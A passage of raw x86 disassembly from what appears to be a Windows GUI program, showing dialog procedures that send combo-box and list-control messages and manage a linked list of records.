  4039e5:	jne    0x403cd0
  4039eb:	cmp    DWORD PTR ds:0x40813c,0x0
  4039f2:	jne    0x403cd0
  4039f8:	mov    ebx,DWORD PTR ds:0x4093bc
  4039fe:	xor    esi,esi
  403a00:	push   esi
  403a01:	push   esi
  403a02:	push   0x188
  403a07:	push   0x3f7
  403a0c:	push   edi
  403a0d:	call   ebx
  403a0f:	push   esi
  403a10:	push   eax
  403a11:	push   0x199
  403a16:	push   0x3f7
  403a1b:	push   edi
  403a1c:	call   ebx
  403a1e:	mov    esi,eax
  403a20:	mov    edi,esi
  403a22:	imul   edi,edi,0xc
  403a25:	push   0x0
  403a27:	push   DWORD PTR [edi+0x407d58]
  403a2d:	push   0x186
  403a32:	push   0x3e8
  403a37:	push   DWORD PTR [ebp-0x48]
  403a3a:	call   ebx
  403a3c:	push   0x0
  403a3e:	push   esi
  403a3f:	mov    esi,DWORD PTR [ebp-0x48]
  403a42:	push   0x186
  403a47:	push   0x3e9
  403a4c:	push   esi
  403a4d:	call   ebx
  403a4f:	push   0x0
  403a51:	push   DWORD PTR [edi+0x407d60]
  403a57:	push   0x186
  403a5c:	push   0x3ea
  403a61:	push   esi
  403a62:	call   ebx
  403a64:	jmp    0x403cd0
  403a69:	shr    ecx,0x10
  403a6c:	cmp    cx,0x1
  403a70:	jne    0x403cd0
  403a76:	mov    esi,DWORD PTR ds:0x4093bc
  403a7c:	xor    ebx,ebx
  403a7e:	push   ebx
  403a7f:	push   ebx
  403a80:	push   0x188
  403a85:	push   0x3e9
  403a8a:	push   edi
  403a8b:	call   esi
  403a8d:	push   ebx
  403a8e:	push   ebx
  403a8f:	mov    ebx,DWORD PTR [ebp-0x48]
  403a92:	push   0x188
  403a97:	push   0x3ea
  403a9c:	push   ebx
  403a9d:	mov    edi,eax
  403a9f:	call   esi
  403aa1:	imul   edi,edi,0xc
  403aa4:	mov    DWORD PTR [edi+0x407d60],eax
  403aaa:	jmp    0x403b48
  403aaf:	shr    ecx,0x10
  403ab2:	cmp    cx,0x1
  403ab6:	jne    0x403cd0
  403abc:	xor    ebx,ebx
  403abe:	push   ebx
  403abf:	push   ebx
  403ac0:	push   0x188
  403ac5:	push   0x3e9
  403aca:	push   edi
  403acb:	mov    edi,DWORD PTR ds:0x4093bc
  403ad1:	call   edi
  403ad3:	mov    esi,eax
  403ad5:	imul   esi,esi,0xc
  403ad8:	push   ebx
  403ad9:	push   DWORD PTR [esi+0x407d58]
  403adf:	push   0x186
  403ae4:	push   0x3e8
  403ae9:	push   DWORD PTR [ebp-0x48]
  403aec:	call   edi
  403aee:	push   ebx
  403aef:	push   DWORD PTR [esi+0x407d60]
  403af5:	mov    ebx,DWORD PTR [ebp-0x48]
  403af8:	push   0x186
  403afd:	push   0x3ea
  403b02:	push   ebx
  403b03:	call   edi
  403b05:	jmp    0x403b48
  403b07:	shr    ecx,0x10
  403b0a:	cmp    cx,0x1
  403b0e:	jne    0x403cd0
  403b14:	mov    esi,DWORD PTR ds:0x4093bc
  403b1a:	xor    ebx,ebx
  403b1c:	push   ebx
  403b1d:	push   ebx
  403b1e:	push   0x188
  403b23:	push   0x3e9
  403b28:	push   edi
  403b29:	call   esi
  403b2b:	push   ebx
  403b2c:	push   ebx
  403b2d:	mov    ebx,DWORD PTR [ebp-0x48]
  403b30:	push   0x188
  403b35:	push   0x3e8
  403b3a:	push   ebx
  403b3b:	mov    edi,eax
  403b3d:	call   esi
  403b3f:	imul   edi,edi,0xc
  403b42:	mov    DWORD PTR [edi+0x407d58],eax
  403b48:	push   0x407d58
  403b4d:	push   ebx
  403b4e:	jmp    0x403c9d
  403b53:	xor    ecx,ecx
  403b55:	mov    eax,DWORD PTR [ecx+0x407d58]
  403b5b:	mov    eax,DWORD PTR [eax*8+0x407008]
  403b62:	mov    DWORD PTR [ecx+0x407098],eax
  403b68:	mov    eax,DWORD PTR [ecx+0x407d60]
  403b6e:	mov    eax,DWORD PTR [eax*8+0x407068]
  403b75:	mov    DWORD PTR [ecx+0x4070a0],eax
  403b7b:	add    ecx,0xc
  403b7e:	cmp    ecx,0x18
  403b81:	jl     0x403b55
  403b83:	push   0x0
  403b85:	push   edi
  403b86:	call   DWORD PTR ds:0x409398
  403b8c:	jmp    0x403cd0
  403b91:	xor    ebx,ebx
  403b93:	mov    ecx,ebx
  403b95:	mov    eax,DWORD PTR [ecx+0x40709c]
  403b9b:	mov    DWORD PTR [ecx+0x407d5c],eax
  403ba1:	mov    eax,ebx
  403ba3:	cmp    DWORD PTR ds:0x40700c,eax
  403ba9:	je     0x403bcf
  403bab:	mov    esi,DWORD PTR [ecx+0x407098]
  403bb1:	mov    edx,ebx
  403bb3:	cmp    esi,DWORD PTR [edx+0x407008]
  403bb9:	jne    0x403bc1
  403bbb:	mov    DWORD PTR [ecx+0x407d58],eax
  403bc1:	inc    eax
  403bc2:	mov    edx,eax
  403bc4:	shl    edx,0x3
  403bc7:	cmp    DWORD PTR [edx+0x40700c],ebx
  403bcd:	jne    0x403bb3
  403bcf:	mov    eax,ebx
  403bd1:	cmp    DWORD PTR ds:0x40706c,eax
  403bd7:	je     0x403bfd
  403bd9:	mov    esi,DWORD PTR [ecx+0x4070a0]
  403bdf:	mov    edx,ebx
  403be1:	cmp    esi,DWORD PTR [edx+0x407068]
  403be7:	jne    0x403bef
  403be9:	mov    DWORD PTR [ecx+0x407d60],eax
  403bef:	inc    eax
  403bf0:	mov    edx,eax
  403bf2:	shl    edx,0x3
  403bf5:	cmp    DWORD PTR [edx+0x40706c],ebx
  403bfb:	jne    0x403be1
  403bfd:	add    ecx,0xc
  403c00:	cmp    ecx,0x18
  403c03:	jl     0x403b95
  403c05:	cmp    DWORD PTR ds:0x40813c,ebx
  403c0b:	je     0x403c23
  403c0d:	push   ebx
  403c0e:	push   0x3f8
  403c13:	push   edi
  403c14:	call   DWORD PTR ds:0x40939c
  403c1a:	push   eax
  403c1b:	call   DWORD PTR ds:0x4093a4
  403c21:	jmp    0x403c97
  403c23:	mov    eax,ds:0x40700c
  403c28:	mov    esi,ebx
  403c2a:	jmp    0x403c47
  403c2c:	push   eax
  403c2d:	push   ebx
  403c2e:	push   0x180
  403c33:	push   0x3e8
  403c38:	push   edi
  403c39:	call   DWORD PTR ds:0x4093bc
  403c3f:	mov    eax,DWORD PTR [esi*8+0x407014]
  403c46:	inc    esi
  403c47:	test   eax,eax
  403c49:	jne    0x403c2c
  403c4b:	mov    esi,0x407d5c
  403c50:	push   DWORD PTR [esi]
  403c52:	push   ebx
  403c53:	push   0x180
  403c58:	push   0x3e9
  403c5d:	push   edi
  403c5e:	call   DWORD PTR ds:0x4093bc
  403c64:	add    esi,0xc
  403c67:	cmp    esi,0x407d74
  403c6d:	jl     0x403c50
  403c6f:	mov    eax,ds:0x40706c
  403c74:	mov    esi,ebx
  403c76:	jmp    0x403c93
  403c78:	push   eax
  403c79:	push   ebx
  403c7a:	push   0x180
  403c7f:	push   0x3ea
  403c84:	push   edi
  403c85:	call   DWORD PTR ds:0x4093bc
  403c8b:	mov    eax,DWORD PTR [esi*8+0x407074]
  403c92:	inc    esi
  403c93:	test   eax,eax
  403c95:	jne    0x403c78
  403c97:	push   0x407d58
  403c9c:	push   edi
  403c9d:	call   0x4054d2
  403ca2:	jmp    0x403cd0
  403ca4:	lea    eax,[ebp-0x44]
  403ca7:	push   eax
  403ca8:	push   edi
  403ca9:	call   DWORD PTR ds:0x409320
  403caf:	push   0x1
  403cb1:	call   DWORD PTR ds:0x409250
  403cb7:	push   eax
  403cb8:	lea    eax,[ebp-0x3c]
  403cbb:	push   eax
  403cbc:	push   DWORD PTR [ebp-0x44]
  403cbf:	call   DWORD PTR ds:0x409350
  403cc5:	lea    eax,[ebp-0x44]
  403cc8:	push   eax
  403cc9:	push   edi
  403cca:	call   DWORD PTR ds:0x409324
  403cd0:	xor    eax,eax
  403cd2:	mov    ecx,DWORD PTR [ebp-0x4]
  403cd5:	pop    edi
  403cd6:	pop    esi
  403cd7:	xor    ecx,ebp
  403cd9:	pop    ebx
  403cda:	call   0x405a3a
  403cdf:	leave  
  403ce0:	ret    0x10
  403ce3:	int3   
  403ce4:	int3   
  403ce5:	int3   
  403ce6:	int3   
  403ce7:	int3   
  403ce8:	mov    edi,edi
  403cea:	push   ebp
  403ceb:	mov    ebp,esp
  403ced:	sub    esp,0x44
  403cf0:	mov    eax,ds:0x407a10
  403cf5:	xor    eax,ebp
  403cf7:	mov    DWORD PTR [ebp-0x4],eax
  403cfa:	mov    eax,DWORD PTR [ebp+0xc]
  403cfd:	mov    ecx,DWORD PTR [ebp+0x10]
  403d00:	push   esi
  403d01:	mov    esi,DWORD PTR [ebp+0x8]
  403d04:	sub    eax,0xf
  403d07:	je     0x403d3b
  403d09:	sub    eax,0x102
  403d0e:	je     0x403d2b
  403d10:	sub    eax,0x27
  403d13:	jne    0x403d67
  403d15:	push   0xc0c0c0
  403d1a:	push   ecx
  403d1b:	call   DWORD PTR ds:0x409248
  403d21:	push   0x1
  403d23:	call   DWORD PTR ds:0x409250
  403d29:	jmp    0x403d69
  403d2b:	movzx  eax,cx
  403d2e:	dec    eax
  403d2f:	jne    0x403d67
  403d31:	push   eax
  403d32:	push   esi
  403d33:	call   DWORD PTR ds:0x409398
  403d39:	jmp    0x403d67
  403d3b:	lea    eax,[ebp-0x44]
  403d3e:	push   eax
  403d3f:	push   esi
  403d40:	call   DWORD PTR ds:0x409320
  403d46:	push   0x1
  403d48:	call   DWORD PTR ds:0x409250
  403d4e:	push   eax
  403d4f:	lea    eax,[ebp-0x3c]
  403d52:	push   eax
  403d53:	push   DWORD PTR [ebp-0x44]
  403d56:	call   DWORD PTR ds:0x409350
  403d5c:	lea    eax,[ebp-0x44]
  403d5f:	push   eax
  403d60:	push   esi
  403d61:	call   DWORD PTR ds:0x409324
  403d67:	xor    eax,eax
  403d69:	mov    ecx,DWORD PTR [ebp-0x4]
  403d6c:	xor    ecx,ebp
  403d6e:	pop    esi
  403d6f:	call   0x405a3a
  403d74:	leave  
  403d75:	ret    0x10
  403d78:	int3   
  403d79:	int3   
  403d7a:	int3   
  403d7b:	int3   
  403d7c:	int3   
  403d7d:	mov    edi,edi
  403d7f:	push   ebp
  403d80:	mov    ebp,esp
  403d82:	sub    esp,0x44
  403d85:	mov    eax,ds:0x407a10
  403d8a:	xor    eax,ebp
  403d8c:	mov    DWORD PTR [ebp-0x4],eax
  403d8f:	mov    eax,DWORD PTR [ebp+0xc]
  403d92:	mov    ecx,DWORD PTR [ebp+0x10]
  403d95:	push   esi
  403d96:	mov    esi,DWORD PTR [ebp+0x8]
  403d99:	sub    eax,0xf
  403d9c:	je     0x403de6
  403d9e:	sub    eax,0x101
  403da3:	je     0x403dd3
  403da5:	dec    eax
  403da6:	je     0x403dc3
  403da8:	sub    eax,0x27
  403dab:	jne    0x403e12
  403dad:	push   0xc0c0c0
  403db2:	push   ecx
  403db3:	call   DWORD PTR ds:0x409248
  403db9:	push   0x1
  403dbb:	call   DWORD PTR ds:0x409250
  403dc1:	jmp    0x403e14
  403dc3:	movzx  eax,cx
  403dc6:	dec    eax
  403dc7:	jne    0x403e12
  403dc9:	push   eax
  403dca:	push   esi
  403dcb:	call   DWORD PTR ds:0x409398
  403dd1:	jmp    0x403e12
  403dd3:	push   0x4073e8
  403dd8:	push   0x3eb
  403ddd:	push   esi
  403dde:	call   DWORD PTR ds:0x4093a0
  403de4:	jmp    0x403e12
  403de6:	lea    eax,[ebp-0x44]
  403de9:	push   eax
  403dea:	push   esi
  403deb:	call   DWORD PTR ds:0x409320
  403df1:	push   0x1
  403df3:	call   DWORD PTR ds:0x409250
  403df9:	push   eax
  403dfa:	lea    eax,[ebp-0x3c]
  403dfd:	push   eax
  403dfe:	push   DWORD PTR [ebp-0x44]
  403e01:	call   DWORD PTR ds:0x409350
  403e07:	lea    eax,[ebp-0x44]
  403e0a:	push   eax
  403e0b:	push   esi
  403e0c:	call   DWORD PTR ds:0x409324
  403e12:	xor    eax,eax
  403e14:	mov    ecx,DWORD PTR [ebp-0x4]
  403e17:	xor    ecx,ebp
  403e19:	pop    esi
  403e1a:	call   0x405a3a
  403e1f:	leave  
  403e20:	ret    0x10
  403e23:	int3   
  403e24:	int3   
  403e25:	int3   
  403e26:	int3   
  403e27:	int3   
  403e28:	mov    edi,edi
  403e2a:	push   ebp
  403e2b:	mov    ebp,esp
  403e2d:	sub    esp,0x54
  403e30:	mov    eax,ds:0x407a10
  403e35:	xor    eax,ebp
  403e37:	mov    DWORD PTR [ebp-0x4],eax
  403e3a:	push   ebx
  403e3b:	mov    ebx,DWORD PTR ds:0x4080f0
  403e41:	push   esi
  403e42:	push   edi
  403e43:	mov    edi,DWORD PTR [ebp+0x8]
  403e46:	mov    eax,DWORD PTR [edi+0x4]
  403e49:	xor    esi,esi
  403e4b:	mov    DWORD PTR [ebp-0x54],edi
  403e4e:	mov    DWORD PTR [ebp-0x48],0xfffffffe
  403e55:	sub    eax,esi
  403e57:	je     0x4041c3
  403e5d:	dec    eax
  403e5e:	je     0x40405f
  403e64:	dec    eax
  403e65:	je     0x403fd7
  403e6b:	dec    eax
  403e6c:	je     0x403f94
  403e72:	dec    eax
  403e73:	jne    0x4042f1
  403e79:	mov    ebx,esi
  403e7b:	mov    DWORD PTR [ebp-0x4c],ebx
  403e7e:	mov    DWORD PTR [ebp-0x48],esi
  403e81:	cmp    DWORD PTR [edi+0x8],esi
  403e84:	jbe    0x403efe
  403e86:	push   0x20
  403e88:	call   0x4045da
  403e8d:	mov    ebx,eax
  403e8f:	mov    eax,DWORD PTR [edi+0x10]
  403e92:	add    eax,DWORD PTR [ebp-0x48]
  403e95:	mov    DWORD PTR [ebx+0x4],esi
  403e98:	mov    DWORD PTR [ebx],eax
  403e9a:	mov    eax,DWORD PTR [ebp-0x4c]
  403e9d:	mov    DWORD PTR [ebx+0x18],eax
  403ea0:	test   eax,eax
  403ea2:	je     0x403ea9
  403ea4:	mov    DWORD PTR [eax+0x1c],ebx
  403ea7:	jmp    0x403eaf
  403ea9:	mov    DWORD PTR ds:0x4080f0,ebx
  403eaf:	push   DWORD PTR [ebx]
  403eb1:	lea    eax,[ebp-0x44]
  403eb4:	push   0x401e5c
  403eb9:	push   0x40
  403ebb:	push   eax
  403ebc:	mov    DWORD PTR [ebp-0x4c],ebx
  403ebf:	call   0x405110
  403ec4:	add    esp,0x10
  403ec7:	lea    eax,[ebp-0x44]
  403eca:	push   eax
  403ecb:	push   esi
  403ecc:	push   0x180
  403ed1:	push   DWORD PTR ds:0x408124
  403ed7:	call   DWORD PTR ds:0x409370
  403edd:	push   ebx
  403ede:	push   DWORD PTR [ebp-0x48]
  403ee1:	push   0x19a
  403ee6:	push   DWORD PTR ds:0x408124
  403eec:	call   DWORD PTR ds:0x409370
  403ef2:	mov    eax,DWORD PTR [ebp-0x48]
  403ef5:	inc    eax
  403ef6:	mov    DWORD PTR [ebp-0x48],eax
  403ef9:	cmp    eax,DWORD PTR [edi+0x8]
  403efc:	jb     0x403e86
  403efe:	mov    DWORD PTR [ebp-0x4c],esi
  403f01:	cmp    DWORD PTR [edi+0xc],esi
  403f04:	jbe    0x40432a
  403f0a:	push   0x20
  403f0c:	call   0x4045da
  403f11:	mov    ecx,eax
  403f13:	mov    eax,DWORD PTR [edi+0x14]
  403f16:	add    eax,DWORD PTR [ebp-0x4c]
  403f19:	mov    DWORD PTR [ebp-0x54],ecx
  403f1c:	mov    DWORD PTR [ecx],eax
  403f1e:	mov    DWORD PTR [ecx+0x4],0x2
  403f25:	mov    DWORD PTR [ecx+0x18],ebx
  403f28:	test   ebx,ebx
  403f2a:	je     0x403f31
  403f2c:	mov    DWORD PTR [ebx+0x1c],ecx
  403f2f:	jmp    0x403f37
  403f31:	mov    DWORD PTR ds:0x4080f0,ecx
  403f37:	push   DWORD PTR [ecx]
  403f39:	lea    eax,[ebp-0x44]
  403f3c:	push   0x401ea8
  403f41:	push   0x40
  403f43:	push   eax
  403f44:	mov    ebx,ecx
  403f46:	call   0x405110
  403f4b:	add    esp,0x10
  403f4e:	lea    eax,[ebp-0x44]
  403f51:	push   eax
  403f52:	push   esi
  403f53:	push   0x180
  403f58:	push   DWORD PTR ds:0x408124
  403f5e:	call   DWORD PTR ds:0x409370
  403f64:	push   DWORD PTR [ebp-0x54]
  403f67:	mov    eax,DWORD PTR [ebp-0x48]
  403f6a:	add    eax,DWORD PTR [ebp-0x4c]
  403f6d:	push   eax
  403f6e:	push   0x19a
  403f73:	push   DWORD PTR ds:0x408124
  403f79:	call   DWORD PTR ds:0x409370
  403f7f:	mov    eax,DWORD PTR [ebp-0x4c]
  403f82:	inc    eax
  403f83:	mov    DWORD PTR [ebp-0x4c],eax
  403f86:	cmp    eax,DWORD PTR [edi+0xc]
  403f89:	jb     0x403f0a
  403f8f:	jmp    0x40432a
  403f94:	push   DWORD PTR [edi]
  403f96:	lea    eax,[ebp-0x44]
  403f99:	push   0x401e50
  403f9e:	push   0x40
  403fa0:	push   eax
  403fa1:	call   0x405110
  403fa6:	add    esp,0x10
  403fa9:	lea    eax,[ebp-0x44]
  403fac:	push   eax
  403fad:	push   esi
  403fae:	mov    esi,DWORD PTR ds:0x409370
  403fb4:	push   0x180
  403fb9:	push   DWORD PTR ds:0x408120
  403fbf:	call   esi
  403fc1:	push   DWORD PTR [edi+0x8]
  403fc4:	push   eax
  403fc5:	push   0x19a
  403fca:	push   DWORD PTR ds:0x408120
  403fd0:	call   esi
  403fd2:	jmp    0x40432a
  403fd7:	mov    ecx,esi
  403fd9:	mov    DWORD PTR [ebp-0x48],esi
  403fdc:	test   ebx,ebx
  403fde:	je     0x404021
  403fe0:	cmp    DWORD PTR [ebx+0x4],0x2
  403fe4:	jne    0x403fec
  403fe6:	mov    eax,DWORD PTR [ebx]
  403fe8:	cmp    eax,DWORD PTR [edi]
  403fea:	je     0x403ff4
  403fec:	mov    ebx,DWORD PTR [ebx+0x1c]
  403fef:	inc    ecx
  403ff0:	test   ebx,ebx
  403ff2:	jne    0x403fe0
  403ff4:	mov    DWORD PTR [ebp-0x48],ecx
  403ff7:	test   ebx,ebx
  403ff9:	je     0x404021
  403ffb:	lea    eax,[ebp-0x44]
  403ffe:	cmp    DWORD PTR [edi+0xc],esi
  404001:	jne    0x40400f
  404003:	push   DWORD PTR [edi]
  404005:	push   0x401ea8
  40400a:	jmp    0x404247
  40400f:	push   DWORD PTR [edi+0xc]
  404012:	push   DWORD PTR [edi+0x8]
  404015:	push   DWORD PTR [edi]
  404017:	push   0x401ebc
  40401c:	jmp    0x404267
  404021:	push   0x20
  404023:	call   0x4045da
  404028:	mov    ecx,DWORD PTR [edi]
  40402a:	mov    ebx,eax
  40402c:	mov    DWORD PTR [ebx],ecx
  40402e:	mov    DWORD PTR [ebx+0x4],0x2
  404035:	mov    ecx,DWORD PTR ds:0x4080f0
  40403b:	test   ecx,ecx
  40403d:	jne    0x404049
  40403f:	mov    DWORD PTR ds:0x4080f0,ebx
  404045:	jmp    0x404053
  404047:	mov    ecx,DWORD PTR [eax]
  404049:	lea    eax,[ecx+0x1c]
  40404c:	cmp    DWORD PTR [eax],esi
  40404e:	jne    0x404047
  404050:	mov    DWORD PTR [ecx+0x1c],ebx
  404053:	push   DWORD PTR [ebx]
  404055:	push   0x401ea8
  40405a:	jmp    0x4042ac
  40405f:	mov    DWORD PTR [ebp-0x50],esi
  404062:	mov    DWORD PTR [ebp-0x4c],esi
  404065:	mov    ecx,esi
  404067:	mov    DWORD PTR [ebp-0x48],esi
  40406a:	test   ebx,ebx
  40406c:	je     0x40411f
  404072:	cmp    DWORD PTR [ebx+0x4],esi
  404075:	jne    0x404083
  404077:	mov    eax,DWORD PTR [ebx]
  404079:	cmp    eax,DWORD PTR [edi]
  40407b:	jne    0x404083
  40407d:	mov    DWORD PTR [ebp-0x4c],ebx
  404080:	mov    DWORD PTR [ebp-0x50],ecx
  404083:	cmp    DWORD PTR [ebx+0x4],0x1
  404087:	jne    0x404091
  404089:	mov    eax,DWORD PTR [ebx+0x8]
  40408c:	cmp    eax,DWORD PTR [edi+0x8]
  40408f:	je     0x404099
  404091:	mov    ebx,DWORD PTR [ebx+0x1c]
  404094:	inc    ecx
  404095:	test   ebx,ebx
  404097:	jne    0x404072
  404099:	mov    DWORD PTR [ebp-0x48],ecx
  40409c:	test   ebx,ebx
  40409e:	je     0x40411f
  4040a0:	cmp    DWORD PTR [edi+0xc],esi
  4040a3:	je     0x4040ea
  4040a5:	mov    ecx,DWORD PTR [edi+0x10]
  4040a8:	mov    eax,esi
  4040aa:	cmp    ecx,DWORD PTR ds:0x4070b0
  4040b0:	je     0x4040bc
  4040b2:	inc    eax
  4040b3:	cmp    ecx,DWORD PTR [eax*8+0x4070b0]
  4040ba:	jne    0x4040b2
  4040bc:	push   DWORD PTR [edi+0x14]
  4040bf:	push   DWORD PTR [eax*8+0x4070b4]
  4040c6:	lea    eax,[ebp-0x44]
  4040c9:	push   DWORD PTR [edi+0xc]
  4040cc:	push   DWORD PTR [edi+0x8]
  4040cf:	push   0x401e84
  4040d4:	push   0x40
  4040d6:	push   eax
  4040d7:	call   0x405110
  4040dc:	mov    eax,DWORD PTR [edi+0x10]
  4040df:	add    esp,0x1c
  4040e2:	mov    DWORD PTR [ebx+0x10],eax
  4040e5:	jmp    0x4042f1
  4040ea:	push   esi
  4040eb:	push   ecx
  4040ec:	push   0x182
  4040f1:	push   DWORD PTR ds:0x408124
  4040f7:	call   DWORD PTR ds:0x409370
  4040fd:	mov    ecx,DWORD PTR [ebx+0x18]
  404100:	mov    eax,DWORD PTR [ebx+0x1c]
  404103:	mov    DWORD PTR [ecx+0x1c],eax
  404106:	mov    ecx,DWORD PTR [ebx+0x1c]
  404109:	test   ecx,ecx
  40410b:	je     0x404113
  40410d:	mov    eax,DWORD PTR [ebx+0x18]
  404110:	mov    DWORD PTR [ecx+0x18],eax
  404113:	push   ebx
  404114:	call   DWORD PTR ds:0x40927c
  40411a:	jmp    0x40432a
  40411f:	cmp    DWORD PTR [edi+0xc],esi
  404122:	je     0x4042f1
  404128:	push   0x20
  40412a:	call   0x4045da
  40412f:	mov    ebx,eax
  404131:	test   ebx,ebx
  404133:	je     0x4042f1
  404139:	push   0x6
  40413b:	mov    esi,edi
  40413d:	pop    ecx
  40413e:	mov    edi,ebx
  404140:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404142:	mov    ecx,DWORD PTR [ebp-0x4c]
  404145:	mov    eax,DWORD PTR [ecx+0x1c]
  404148:	mov    DWORD PTR [ebx+0x1c],eax
  40414b:	test   eax,eax
  40414d:	je     0x404152
  40414f:	mov    DWORD PTR [eax+0x18],ebx
  404152:	mov    eax,DWORD PTR [ebp-0x54]
  404155:	mov    DWORD PTR [ebx+0x18],ecx
  404158:	mov    DWORD PTR [ecx+0x1c],ebx
  40415b:	mov    edx,DWORD PTR [eax+0x10]
  40415e:	xor    ecx,ecx
  404160:	cmp    edx,DWORD PTR ds:0x4070b0
  404166:	je     0x404172
  404168:	inc    ecx
  404169:	cmp    edx,DWORD PTR [ecx*8+0x4070b0]
  404170:	jne    0x404168
  404172:	push   DWORD PTR [eax+0x14]
  404175:	push   DWORD PTR [ecx*8+0x4070b4]
  40417c:	push   DWORD PTR [eax+0xc]
  40417f:	push   DWORD PTR [eax+0x8]
  404182:	lea    eax,[ebp-0x44]
  404185:	push   0x401e84
  40418a:	push   0x40
  40418c:	push   eax
  40418d:	call   0x405110
  404192:	mov    edi,DWORD PTR [ebp-0x50]
  404195:	mov    esi,DWORD PTR ds:0x409370
  40419b:	add    esp,0x1c
  40419e:	lea    eax,[ebp-0x44]
  4041a1:	push   eax
  4041a2:	inc    edi
  4041a3:	push   edi
  4041a4:	push   0x181
  4041a9:	push   DWORD PTR ds:0x408124
  4041af:	call   esi
  4041b1:	push   ebx
  4041b2:	push   edi
  4041b3:	push   0x19a
  4041b8:	push   DWORD PTR ds:0x408124
  4041be:	jmp    0x403fd0
  4041c3:	mov    ecx,esi
  4041c5:	mov    DWORD PTR [ebp-0x48],esi
  4041c8:	test   ebx,ebx
  4041ca:	je     0x404274
  4041d0:	cmp    DWORD PTR [ebx+0x4],esi
  4041d3:	jne    0x4041db
  4041d5:	mov    eax,DWORD PTR [ebx]
  4041d7:	cmp    eax,DWORD PTR [edi]
  4041d9:	je     0x4041e3
  4041db:	mov    ebx,DWORD PTR [ebx+0x1c]
  4041de:	inc    ecx
  4041df:	test   ebx,ebx
  4041e1:	jne    0x4041d0
  4041e3:	mov    DWORD PTR [ebp-0x48],ecx
  4041e6:	test   ebx,ebx
  4041e8:	je     0x404274
  4041ee:	cmp    DWORD PTR [edi+0xc],esi
  4041f1:	jne    0x404257
  4041f3:	mov    ecx,DWORD PTR [ebx+0x1c]
  4041f6:	test   ecx,ecx
  4041f8:	je     0x40423d
  4041fa:	mov    edi,DWORD PTR [ebp-0x48]
  4041fd:	cmp    DWORD PTR [ecx+0x4],0x1
  404201:	jne    0x404233
  404203:	mov    eax,DWORD PTR [ecx+0x1c]
  404206:	push   ecx
  404207:	mov    DWORD PTR [ebx+0x1c],eax
  40420a:	call   DWORD PTR ds:0x40927c
  404210:	mov    eax,DWORD PTR [ebx+0x1c]
  404213:	push   esi
  404214:	mov    DWORD PTR [ebp-0x50],eax
  404217:	lea    eax,[edi+0x1]
  40421a:	push   eax
  40421b:	push   0x182
  404220:	push   DWORD PTR ds:0x408124
  404226:	call   DWORD PTR ds:0x409370
  40422c:	mov    ecx,DWORD PTR [ebp-0x50]
  40422f:	test   ecx,ecx
  404231:	jne    0x4041fd
  404233:	mov    edi,DWORD PTR [ebp-0x54]
  404236:	test   ecx,ecx
  404238:	je     0x40423d
  40423a:	mov    DWORD PTR [ecx+0x18],ebx
  40423d:	push   DWORD PTR [edi]
  40423f:	lea    eax,[ebp-0x44]
  404242:	push   0x401e5c
  404247:	push   0x40
  404249:	push   eax
  40424a:	call   0x405110
  40424f:	add    esp,0x10
  404252:	jmp    0x4042e5
  404257:	push   DWORD PTR [edi+0xc]
  40425a:	lea    eax,[ebp-0x44]
  40425d:	push   DWORD PTR [edi+0x8]
  404260:	push   DWORD PTR [edi]
  404262:	push   0x401e6c
  404267:	push   0x40
  404269:	push   eax
  40426a:	call   0x405110
  40426f:	add    esp,0x18
  404272:	jmp    0x4042e5
  404274:	push   0x20
  404276:	call   0x4045da
  40427b:	mov    ebx,eax
  40427d:	test   ebx,ebx
  40427f:	je     0x4042f1
  404281:	mov    eax,DWORD PTR [edi]
  404283:	mov    DWORD PTR [ebx],eax
  404285:	mov    DWORD PTR [ebx+0x4],esi
  404288:	mov    eax,ds:0x4080f0
  40428d:	test   eax,eax
  40428f:	jne    0x40429b
  404291:	mov    DWORD PTR ds:0x4080f0,ebx
  404297:	jmp    0x4042a5
  404299:	mov    eax,DWORD PTR [ecx]
  40429b:	lea    ecx,[eax+0x1c]
  40429e:	cmp    DWORD PTR [ecx],esi
  4042a0:	jne    0x404299
  4042a2:	mov    DWORD PTR [eax+0x1c],ebx
  4042a5:	push   DWORD PTR [ebx]
  4042a7:	push   0x401e5c
  4042ac:	lea    eax,[ebp-0x44]
  4042af:	push   0x40
  4042b1:	push   eax
  4042b2:	call   0x405110
  4042b7:	add    esp,0x10
  4042ba:	lea    eax,[ebp-0x44]
  4042bd:	push   eax
  4042be:	push   esi
  4042bf:	push   0x180
  4042c4:	push   DWORD PTR ds:0x408124
  4042ca:	call   DWORD PTR ds:0x409370
  4042d0:	push   ebx
  4042d1:	push   DWORD PTR [ebp-0x48]
  4042d4:	push   0x19a
  4042d9:	push   DWORD PTR ds:0x408124
  4042df:	call   DWORD PTR ds:0x409370
  4042e5:	mov    eax,DWORD PTR [edi+0x8]
  4042e8:	mov    DWORD PTR [ebx+0x8],eax
  4042eb:	mov    eax,DWORD PTR [edi+0xc]
  4042ee:	mov    DWORD PTR [ebx+0xc],eax
  4042f1:	mov    edi,DWORD PTR ds:0x409370
  4042f7:	push   esi
  4042f8:	mov    esi,DWORD PTR [ebp-0x48]
  4042fb:	push   esi
  4042fc:	push   0x182
  404301:	push   DWORD PTR ds:0x408124
  404307:	call   edi
  404309:	lea    eax,[ebp-0x44]
  40430c:	push   eax
  40430d:	push   esi
  40430e:	push   0x181
  404313:	push   DWORD PTR ds:0x408124
  404319:	call   edi
  40431b:	push   ebx
  40431c:	push   esi
  40431d:	push   0x19a
  404322:	push   DWORD PTR ds:0x408124
  404328:	call   edi
  40432a:	mov    ecx,DWORD PTR [ebp-0x4]
  40432d:	pop    edi
  40432e:	pop    esi
  40432f:	xor    ecx,ebp
  404331:	pop    ebx
  404332:	call   0x405a3a
  404337:	leave  
  404338:	ret    0x4
  40433b:	int3   
  40433c:	int3   
  40433d:	int3   
  40433e:	int3   
  40433f:	int3   
  404340:	push   0x8
  404342:	push   0x4063d8
  404347:	call   0x405a50
  40434c:	cmp    DWORD PTR ds:0x407d34,0x0
  404353:	je     0x40438e
  404355:	and    DWORD PTR [ebp-0x4],0x0
  404359:	push   DWORD PTR ds:0x408100
  40435f:	push   DWORD PTR ds:0x408104
  404365:	call   0x40560a
  40436a:	jmp    0x404387
  40436c:	mov    eax,DWORD PTR [ebp-0x14]
  40436f:	mov    eax,DWORD PTR [eax]
  404371:	push   DWORD PTR [eax]
  404373:	call   0x4063ba
  404378:	ret    
  404379:	mov    esp,DWORD PTR [ebp-0x18]
  40437c:	push   0x401ed4
  404381:	call   0x40457b
  404386:	pop    ecx
  404387:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40438e:	call   0x405a95
  404393:	ret    
  404394:	int3   
  404395:	int3   
  404396:	int3   
  404397:	int3   
  404398:	int3   
